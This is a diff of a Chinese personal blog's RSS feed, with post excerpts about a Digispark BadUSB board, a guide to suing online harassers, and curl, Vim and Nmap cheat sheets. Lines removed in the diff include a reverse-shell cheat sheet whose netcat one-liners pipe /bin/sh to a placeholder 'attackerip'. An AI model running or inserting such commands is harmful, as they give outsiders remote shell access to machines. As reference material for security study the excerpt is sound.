@@ -38,40 +38,9 @@
 &lt;p>&lt;img src="https://s3.amazonaws.com/digistump-resources/images/l/2520dcf84a0a3bf2257c2559d7a187db.jpg" alt="Digispark" style="zoom:50%;" />&lt;/p>
 &lt;p>简单介绍下 Digispark 这个小玩意儿：&lt;/p>
 &lt;p>Digispark USB Development Board 是一块基于 ATTiny85 微控制器的开发板，便宜小巧携带方便，某宝上十块包邮，相比于 BadUSB 的老前辈 USB Rubber Ducky 简直是便宜到家了好吗，性价比真的超高。&lt;span class="spoiler" >&lt;del>绝不承认不买 Rubber Ducky 是没钱，哼！&lt;/del>&lt;/span>&lt;/p>
-&lt;p>关于 BadUSB，网上很多人都觉得只是含有有害程序的 U 盘，并以为可以通过格式化、禁止 U 盘自启动来阻止 BadUSB 的攻击。但其实它更像是没有按键的键盘，靠着烧录进去的程序来模拟人类输入，计算机是无法识别出 BadUSB 和人类正常输入的区别的。所以大家记得一定不要随便在自己或公司的电脑上插来历不明的 U 盘！&lt;/p></description></item><item><title>Curl Cheat Sheet</title><link>https://hare.one/posts/curl-cheat-sheet/</link><pubDate>Fri, 17 Jul 2020 16:30:13 +0800</pubDate><guid>https://hare.one/posts/curl-cheat-sheet/</guid><description>&lt;h3 id="options">Options&lt;/h3>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">curl -o &amp;lt;file&amp;gt; &lt;span style="color:#75715e"># --output: write to file&lt;/span>
-curl -u user:pass &lt;span style="color:#75715e"># --user: Authentication&lt;/span>
-curl -v &lt;span style="color:#75715e"># --verbose&lt;/span>
-curl -vv &lt;span style="color:#75715e"># Even more verbose&lt;/span>
-curl -s &lt;span style="color:#75715e"># --silent&lt;/span>
-curl -i &lt;span style="color:#75715e"># --include: Include the HTTP-header in the output&lt;/span>
-curl -I &lt;span style="color:#75715e"># --head: headers only&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>怎样诉讼躲在屏幕后面疯狂攻击你的人</title><link>https://hare.one/posts/how-to-sue-somebody-for-harassing/</link><pubDate>Tue, 14 Jul 2020 13:17:12 +0800</pubDate><guid>https://hare.one/posts/how-to-sue-somebody-for-harassing/</guid><description>&lt;h2 id="怎样告躲在屏幕后面疯狂攻击你的人其实很简单完全指南来了">怎样告躲在屏幕后面疯狂攻击你的人？其实很简单，完全指南来了&lt;/h2>
+&lt;p>关于 BadUSB，网上很多人都觉得只是含有有害程序的 U 盘，并以为可以通过格式化、禁止 U 盘自启动来阻止 BadUSB 的攻击。但其实它更像是没有按键的键盘，靠着烧录进去的程序来模拟人类输入，计算机是无法识别出 BadUSB 和人类正常输入的区别的。所以大家记得一定不要随便在自己或公司的电脑上插来历不明的 U 盘！&lt;/p></description></item><item><title>怎样诉讼躲在屏幕后面疯狂攻击你的人</title><link>https://hare.one/posts/how-to-sue-somebody-for-harassing/</link><pubDate>Tue, 14 Jul 2020 13:17:12 +0800</pubDate><guid>https://hare.one/posts/how-to-sue-somebody-for-harassing/</guid><description>&lt;h2 id="怎样告躲在屏幕后面疯狂攻击你的人其实很简单完全指南来了">怎样告躲在屏幕后面疯狂攻击你的人？其实很简单，完全指南来了&lt;/h2>
 &lt;h3 id="如果你觉得微博上有人肆无忌惮地伤害您您又不知道-ta-是谁不知怎么告-ta一步一步这样做">如果你觉得微博上有人肆无忌惮地伤害您，您又不知道 TA 是谁、不知怎么告 TA，一步一步这样做&lt;/h3>
 &lt;p>1，找你居住地的公证处，要求公证这些令你觉得受到伤害的帖子。通常大约 1000 元左右。注意，您要亲自去一下公证处。可以电话预约。保留好发票！有人最后会报销的。&lt;/p>
 &lt;p>居住地的含义是你现在居住的地方而不是户籍地，只需要有暂住证或居住证。&lt;/p>
 &lt;p>2，在你居住地的法院，提交诉讼。诉讼费约 50 元。如果觉得写诉状头疼，可以延请你信任的任何人，甚至不一定是执业律师。诉讼制度改革后，法院目前对此类诉状基本去了就受理。&lt;/p>
-&lt;p>律师费高低不等，不过不会白花钱的，把发票放好，最后也会有人报销。所以强烈建议找个律师并给予全面授权，他或者她会为您办很多事情，包括并不限于全权代理您出庭，您自己都可以不去。&lt;/p></description></item><item><title>Vim Cheat Sheet</title><link>https://hare.one/posts/vim-cheat-sheet/</link><pubDate>Wed, 01 Jul 2020 17:32:10 +0800</pubDate><guid>https://hare.one/posts/vim-cheat-sheet/</guid><description>&lt;h3 id="全局">全局&lt;/h3>
-&lt;pre>&lt;code class="language-wiki" data-lang="wiki">:h[elp] 关键字 - 打开关键字帮助
-:sav[eas] 文件名 - 另存为
-:clo[se] - 关闭当前窗口
-:ter[minal] - open a terminal window
-K - 打开光标所在单词的man页面
-&lt;/code>&lt;/pre></description></item><item><title>Nmap Cheat Sheet</title><link>https://hare.one/posts/namp-cheat-sheet/</link><pubDate>Wed, 01 Jul 2020 17:27:34 +0800</pubDate><guid>https://hare.one/posts/namp-cheat-sheet/</guid><description>&lt;h3 id="nmap-target-selection">Nmap Target Selection&lt;/h3>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">&lt;span style="color:#75715e">#Scan a single IP&lt;/span>
-nmap 192.168.1.1
-&lt;span style="color:#75715e">#Scan a host&lt;/span>
-nmap www.testhostname.com
-&lt;span style="color:#75715e">#Scan a range of IPs&lt;/span>
-nmap 192.168.1.1-20
-&lt;span style="color:#75715e">#Scan a subnet&lt;/span>
-nmap 192.168.1.0/24
-&lt;span style="color:#75715e">#Scan targets from a text file&lt;/span>
-nmap -iL list-of-ips.txt
-&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Reverse Shell Cheat Sheet</title><link>https://hare.one/posts/reverse-shell-cheat-sheet/</link><pubDate>Tue, 30 Jun 2020 17:22:05 +0800</pubDate><guid>https://hare.one/posts/reverse-shell-cheat-sheet/</guid><description>&lt;h2 id="利用-nc-监听端口">利用 nc 监听端口&lt;/h2>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">nc -lvp &lt;span style="color:#ae81ff">2333&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="nc-版本">nc 版本&lt;/h2>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">nc -e /bin/sh attackerip &lt;span style="color:#ae81ff">2333&lt;/span>
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc attackerip &lt;span style="color:#ae81ff">2333&lt;/span> &amp;gt;/tmp/f
-nc attackerip 8888|/bin/sh|nc attackerip &lt;span style="color:#ae81ff">9999&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div></description></item></channel></rss>
+&lt;p>律师费高低不等，不过不会白花钱的，把发票放好，最后也会有人报销。所以强烈建议找个律师并给予全面授权，他或者她会为您办很多事情，包括并不限于全权代理您出庭，您自己都可以不去。&lt;/p></description></item></channel></rss>
